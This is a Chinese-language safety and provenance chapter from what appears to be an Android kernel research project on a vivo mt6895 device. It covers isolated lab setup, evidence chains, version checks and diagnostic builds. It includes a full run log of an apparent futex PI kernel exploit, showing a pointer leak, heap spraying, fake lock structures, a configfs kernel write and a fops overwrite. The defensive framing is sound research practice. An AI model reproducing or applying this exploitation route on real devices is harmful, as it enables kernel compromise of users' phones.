# 01 — 观测、产物来源与实验安全

[English](../01-observation.md) · [项目首页](../../README.zh-CN.md)

## 结论先行

团队只有能够证明**运行了什么、在哪里运行、故障前观测到什么**，内核结论才可信。因此观测系统本身就是安全边界；它不应依赖不透明预加载对象，也不应让未经审查的产物接触开发工作站、个人手机、签名密钥或已授权 ADB 会话。

## 安全实验基线

- 使用可恢复出厂镜像的专用样机；不放个人数据、SIM 卡、账户、凭据，也不接生产网络。
- 首次运行前，在法律和技术条件允许时准备精确的出厂/OTA 恢复包，确认该机型的正常重启与 Recovery 进入方式，保证电量充足，并保存设备所有者需要的解锁/恢复凭据。
- 工作站与设备置于隔离网络，关闭不必要的外联。
- 在一次性环境中从已审查源码构建，记录源码提交、编译器/工具链、配置与产物摘要。
- 不运行 Issue 或群聊附件。`LD_PRELOAD` 库会在名义程序的 `main()` 之前执行，既能伪造日志，也能控制宿主进程。
- 只采集必要日志。发布前删除序列号、boot ID、运行时绝对地址、令牌与用户数据。

发生卡死或黑屏时，按根 README 引用的 vivo 官方强制重启步骤处理：当前全面屏机型同时按住电源键与音量减键 10 秒以上。强制重启只是第一恢复动作，并不能证明设备没有受损；即使出现 Recovery 菜单，也不要因为慌乱而选择清除数据或刷写选项。

## 证据链

每轮测试应绑定以下字段：

| 字段 | 作用 |
| --- | --- |
| 设备/构建身份 | 防止把结论归到错误 OTA 或厂商分支 |
| 源码提交与工作树状态 | 保证被测逻辑可审查 |
| 工具链与配置 | 解释 ABI、CFI、检测器和布局差异 |
| 产物 SHA-256 | 发现构建到执行之间的替换 |
| 启动身份与单调时间 | 区分轮次，同时避免公开稳定设备标识 |
| 预先声明的通过/失败判据 | 防止事后解释 |
| panic/oops 证据 | 区分超时、用户态失败与内核失败 |

摘要只能证明文件等同于某个已知产物，不能证明产物无害。必须先做源码审查和可复现构建。

## 所给运行日志的有限解释

所给日志到达 `route-summary ... route_done=1`，随后以 `u:r:shell:s0` 打印 `uid=2000(shell)`，与启动时非特权身份一致。因此它可作为本轮“观测/route 产物完成并返回，且没有提权”的正向判据；它不是 root 证据，不证明二进制普遍安全，也不证明其他构建行为。由于启动时已记录 `enforce=0`，不能把任何 SELinux 状态变化归因给本轮。

目标互锁必须独立测试。设备观测元组为 PD2314/V2314A、`k6895v1_64`、`mt6895`、`arm64-v8a`、显示版本 `PD2314_A_15.2.18.0.W10`、内核 release `5.10.233-android12-9-g44ec642832da-dirty`；而产物打印的 profile 标签指向 `15.2.17.1`，所以这次正向运行不能证明精确版本拒绝。应在主动探测之前执行 fail-closed 检查，并设置负向判据：机型、board、platform、显示版本、fingerprint、内核 release、ABI 任一不符或属性不可读，都必须立即退出。

### 运行日志

```
[*] kernelsnitch collision-scan found=7/7 elapsed_ms=1595
[*] kernelsnitch collision-scan leaked mm=ffffff816a8c6cc0
[*] timing stage=page-mm-layout pid=8189 elapsed_ms=3817
[*] tcp payload geometry slab_base=ffffff816a8c0000 payload_base=ffffff816a8c0000 payload_bias=0xe80 fake_lock=ffffff816a8c1350 fake_w0=ffffff816a8c2220 fake_task=ffffff816a8c5800 fake_fops=ffffff816a8c1000 wait_lock=ffffff816a8c1370 owner=ffffff816a8c5801
[*] final lock mode=active-final base=ffffff816a8c1350 lock=ffffff816a8c1370 root=ffffff816a8c2220 leftmost=ffffff816a8c2220 owner=ffffff816a8c5801 fake_w0_prio=255 pi_parent=ffffff816a8c0ff8 pi_top=ffffffeb188ec200
[*] tcp fops pi geometry parent=ffffff816a8c0ff8 right=0000000000000000 left=0000000000000000 final_pi_write=1 waiter_lock=ffffff816a8c1370
[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff816a8c1000
[*] timing stage=page-leak-payload pid=8189 elapsed_ms=3818
[*] af_unix order3 staged pairs=64 requested=64
[*] timing stage=page-spray-stage pid=8189 elapsed_ms=3819
[*] sk_buff pcp send ret=65536 errno=0
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
[*] timing stage=page-reclaim-send pid=8189 elapsed_ms=3973
[-] kpage state unavailable flags_fd=-1 count_fd=-1 errno=13
[*] timing stage=page-cleanup pid=8189 elapsed_ms=5038
[*] timing stage=page-total pid=8189 elapsed_ms=5039
[*] timing stage=fops-page pid=8189 elapsed_ms=5039
[+] refclone fops page ready base=ffffff816a8c0000
[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x888 marker_off=0x58 target=x28+0x38 value=ffffff816a8c1370 final_fops=1 full_waiter=0 overlay=marker
[*] slide final tree parent=ffffff8002c84ea0 right=ffffff816a8c1000 left=0 pi_write=1
[*] slide ip overlay qwords 20=ffffff8002c84ea0 28=ffffff816a8c1000 30=0 38=ffffff816a8c0ff8 40=0 48=0 50=ffffffeb188ec200 58=ffffff816a8c1370 60=00000000000000ff
[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
[*] main route chain released ret=0 errno=0 owner=0/0 safe=1
[*] main waiter pi scrub ret=-1 errno=110 ok=1
[*] configfs write window target=ffffffeb18a84ea8 base=ffffffeb18000000 pos=0xa884ea8 len=8 ret=8 errno=0
[*] misc.fops restore target=ffffffeb18a84ea8 original=ffffffeb1838fbd8 ret=8 errno=0
[+] misc.fops restored to ashmem_fops — ashmem safe
[+] route-summary pid=8189 kaslr=1 base=ffffffeb15e00000 slide=0000002b0de00000 route_done=1
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(addb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
```


复位步骤通过 configfs 写窗口将原始 `ashmem_fops` 地址写回 `misc.fops` 槽（`ret=8` = 写入 8 字节，`errno=0` = 成功）。此后设备未崩溃、未重启，ashmem 访问安全。这是对本构建复位逻辑的正向安全判据；在未独立验证 `ashmem_fops` 偏移和 configfs 写窗口可用性的情况下，不推广至其他构建。

## 抗故障日志

工程实验建议使用两个互相独立的通道：

1. 低时延主机通道，记录里程碑和时间。
2. 直写本地记录，保留崩溃前最后一个完成状态。

两者均不得写入秘密，也不得在量产环境长期开放。一次 syscall 成功返回只证明该返回条件，不证明内部内存安全；反过来，缺少一行日志也不能自动推断内核 panic，除非主机传输和用户态进程状态已由独立证据确认。

## 建议的诊断构建

在拥有源码控制权时，使用独立工程内核组合启用厂商可承受的 lockdep、rtmutex 调试、KASAN、KCSAN、UBSAN 和故障注入。检测器会改变时序与性能，不应放入量产设备。

断言应围绕不变量，而非攻击者几何：

- 任务从 PI 等待路径返回后，除非仍真实阻塞，否则 `pi_blocked_on == NULL`。
- 修改哪个任务的 PI 字段，就必须持有哪个任务的 `pi_lock`。
- waiter 从两棵 RB 树删除后，不再能从 `rb_leftmost` 到达。
- 早期错误清理只依赖该时刻保证已初始化的 waiter 字段。

## 公开规则

可公开源码片段、最小化轨迹、符号偏移和验证矩阵；不要公开实时设备地址、不透明 payload、预编译 preload 库，或把生命周期缺陷转化为权限修改原语的操作序列。
